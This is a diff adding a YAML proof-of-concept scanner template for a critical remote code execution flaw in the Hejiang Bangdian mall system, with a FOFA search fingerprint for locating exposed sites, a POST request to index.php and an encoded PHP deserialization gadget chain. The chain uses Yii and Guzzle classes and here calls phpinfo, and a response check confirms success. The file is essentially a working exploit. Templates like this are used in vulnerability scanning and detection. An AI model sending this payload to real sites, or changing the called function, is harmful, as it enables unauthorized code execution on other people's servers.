@@ -1,0 +1,18 @@
+id: poc-yaml-hejiangbangdian-mall-system-index-php-rce
+info:
+  name: 禾匠榜店商城系统 index.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: 禾匠榜店商城
+  fofa: body="const _scriptUrl"
+requests:
+- method: POST
+  path: /web/index.php?r=api/testOrderSubmit/index/submit&_mall_id=1
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: form_data=O%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A24%3A%22GuzzleHttp%5CPsr7%5CFnStream%22%3A1%3A%7Bs%3A9%3A%22_fn_close%22%3Bs%3A7%3A%22phpinfo%22%3B%7D%7D
+  expression: status_code == 200 && contains(body,"PHP Version") && contains(body,"PHP
+    API") && contains(body,"<title>phpinfo()</title>")
+variables: {}
+transport: http
